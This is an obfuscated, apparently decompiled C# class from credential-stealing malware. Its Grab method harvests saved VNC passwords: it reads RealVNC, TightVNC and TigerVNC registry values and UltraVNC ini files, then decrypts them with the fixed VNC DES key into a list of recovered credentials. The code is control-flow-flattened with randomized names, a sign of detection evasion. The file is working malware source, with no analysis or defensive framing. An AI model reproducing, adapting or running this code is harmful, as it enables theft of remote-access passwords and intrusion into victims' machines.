using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class I5ElxL : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string biv0Ahj
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public I5ElxL()
	{
		biv0Ahj = "";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		List<Tuple<string, string, string>> list2 = default;
		RegistryKey registryKey = default;
		int num2 = default;
		while (true)
		{
			if (num == 13)
			{
				goto IL_001f;
			}
			goto IL_0048;
			IL_0048:
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 3)
			{
				list2.Add(new Tuple<string, string, string>("RealVNC 4.x", "SOFTWARE\\Wow6432Node\\RealVNC\\WinVNC4", "Password"));
				num = 4;
			}
			if (num == 12)
			{
				goto IL_044d;
			}
			if (num == 16)
			{
				if (registryKey == null)
				{
					goto IL_043f;
				}
				num = 17;
			}
			if (num == 8)
			{
				list2.Add(new Tuple<string, string, string>("TightVNC", "Software\\TightVNC\\Server", "PasswordViewOnly"));
				num = 9;
			}
			if (num == 7)
			{
				list2.Add(new Tuple<string, string, string>("TightVNC", "Software\\TightVNC\\Server", "Password"));
				num = 8;
			}
			if (num == 10)
			{
				list2.Add(new Tuple<string, string, string>("TigerVNC", "Software\\TigerVNC\\Server", "Password"));
				num = 11;
			}
			if (num == 11)
			{
				num2 = 0;
				num = 12;
			}
			if (num == 5)
			{
				list2.Add(new Tuple<string, string, string>("RealVNC 4.x", "SOFTWARE\\RealVNC\\WinVNC4", "Password"));
				num = 6;
			}
			if (num == 4)
			{
				list2.Add(new Tuple<string, string, string>("RealVNC 3.x", "SOFTWARE\\RealVNC\\vncserver", "Password"));
				num = 5;
			}
			if (num == 9)
			{
				list2.Add(new Tuple<string, string, string>("TightVNC ControlPassword", "Software\\TightVNC\\Server", "ControlPassword"));
				num = 10;
			}
			if (num == 2)
			{
				list2 = new List<Tuple<string, string, string>>();
				num = 3;
			}
			if (num == 6)
			{
				list2.Add(new Tuple<string, string, string>("RealVNC 3.x", "Software\\ORL\\WinVNC3", "Password"));
				num = 7;
			}
			if (num == 14)
			{
				if (registryKey != null)
				{
					goto IL_033e;
				}
				num = 15;
			}
			if (num == 15)
			{
				registryKey = Registry.CurrentUser.OpenSubKey(list2[num2].Item2);
				num = 16;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num == 17)
			{
				goto IL_033e;
			}
			continue;
			IL_001f:
			registryKey = Registry.LocalMachine.OpenSubKey(list2[num2].Item2);
			num = 14;
			goto IL_0048;
			IL_043f:
			num2++;
			goto IL_044d;
			IL_033e:
			try
			{
				object value = registryKey.GetValue(list2[num2].Item3);
				if (value != null)
				{
					byte[] array = new byte[0];
					array = ((!(value.GetType() == typeof(string))) ? ((byte[])value) : b4v.H4VWdV77v((string)value));
					string text = xB6AM(array);
					if (!string.IsNullOrEmpty(text))
					{
						list.Add(new ii68
						{
							oVAe = list2[num2].Item1,
							_9H5rP7hg2 = text.Trim(),
							byIdLuuGZbL = "",
							S8v = ""
						});
					}
				}
			}
			catch
			{
			}
			goto IL_043f;
			IL_044d:
			if (num2 > list2.Count - 1)
			{
				break;
			}
			goto IL_001f;
		}
		List<Tuple<string, string, string>> list3 = new List<Tuple<string, string, string>>();
		list3.Add(new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles(x86)") + "\\uvnc bvba\\UltraVNC\\ultravnc.ini", "passwd"));
		list3.Add(new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles(x86)") + "\\uvnc bvba\\UltraVNC\\ultravnc.ini", "passwd2"));
		list3.Add(new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles") + "\\uvnc bvba\\UltraVNC\\ultravnc.ini", "passwd"));
		list3.Add(new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles") + "\\uvnc bvba\\UltraVNC\\ultravnc.ini", "passwd2"));
		list3.Add(new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles") + "\\UltraVNC\\ultravnc.ini", "passwd"));
		list3.Add(new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles") + "\\UltraVNC\\ultravnc.ini", "passwd2"));
		list3.Add(new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles(x86)") + "\\UltraVNC\\ultravnc.ini", "passwd"));
		list3.Add(new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles(x86)") + "\\UltraVNC\\ultravnc.ini", "passwd2"));
		for (int i = 0; i <= list3.Count - 1; i++)
		{
			if (!File.Exists(list3[i].Item2))
			{
				continue;
			}
			string text2 = list3[i].Item3 + "=";
			string[] array2 = File.ReadAllLines(list3[i].Item2);
			string[] array3 = array2;
			foreach (string text3 in array3)
			{
				if (text3.Contains(text2))
				{
					string text4 = text3.Replace(text2, "").Trim(new char[2] { '\r', '\n' });
					if (text4.Length > 16)
					{
						text4 = text4.Substring(0, 16);
					}
					byte[] array4 = b4v.H4VWdV77v(text4);
					string text5 = xB6AM(array4);
					if (!string.IsNullOrEmpty(text5))
					{
						list.Add(new ii68
						{
							oVAe = list3[i].Item1,
							_9H5rP7hg2 = text5.Trim(),
							byIdLuuGZbL = "",
							S8v = ""
						});
					}
				}
			}
		}
		return list;
	}

	private static string xB6AM(byte[] _2nynvChaR7g)
	{
		int num = 0;
		int num2 = default;
		byte[] array = default;
		byte[] array2 = default;
		ICryptoTransform cryptoTransform = default;
		byte[] array3 = default;
		DESCryptoServiceProvider dESCryptoServiceProvider = default;
		DES dES = default;
		do
		{
			if (num == 7)
			{
				num2++;
				num = 8;
			}
			if (num == 9)
			{
				array = array2;
				num = 10;
			}
			if (num == 15)
			{
				cryptoTransform.TransformBlock(_2nynvChaR7g, 0, _2nynvChaR7g.Length, array3, 0);
				num = 16;
			}
			if (num == 11)
			{
				dESCryptoServiceProvider.Padding = PaddingMode.None;
				num = 12;
			}
			if (num == 14)
			{
				cryptoTransform = dES.CreateDecryptor(array, null);
				num = 15;
			}
			if (num == 13)
			{
				dES = dESCryptoServiceProvider;
				num = 14;
			}
			if (num == 4)
			{
				num2 = 0;
				num = 5;
			}
			if (num == 8)
			{
				goto IL_013e;
			}
			goto IL_0155;
			IL_0326:
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_013e:
			if (num2 > 7)
			{
				num = 9;
				goto IL_0155;
			}
			goto IL_0260;
			IL_0260:
			array2[num2] = Convert.ToByte(((array[num2] & 1) << 7) | ((array[num2] & 2) << 5) | ((array[num2] & 4) << 3) | ((array[num2] & 8) << 1) | ((array[num2] & 0x10) >> 1) | ((array[num2] & 0x20) >> 3) | ((array[num2] & 0x40) >> 5) | ((array[num2] & 0x80) >> 7));
			num = 7;
			goto IL_0326;
			IL_0155:
			if (num == 12)
			{
				dESCryptoServiceProvider.Mode = CipherMode.ECB;
				num = 13;
			}
			if (num == 5)
			{
				goto IL_013e;
			}
			if (num == 2)
			{
				array3 = new byte[_2nynvChaR7g.Length - 1 + 1];
				num = 3;
			}
			if (num == 1)
			{
				array = new byte[8] { 23, 82, 107, 6, 35, 78, 88, 7 };
				num = 2;
			}
			if (num == 3)
			{
				array2 = new byte[8];
				num = 4;
			}
			if (num == 10)
			{
				dESCryptoServiceProvider = new DESCryptoServiceProvider();
				num = 11;
			}
			if (num == 6)
			{
				goto IL_0260;
			}
			goto IL_0326;
		}
		while (num != 16);
		return Encoding.ASCII.GetString(array3);
	}
}
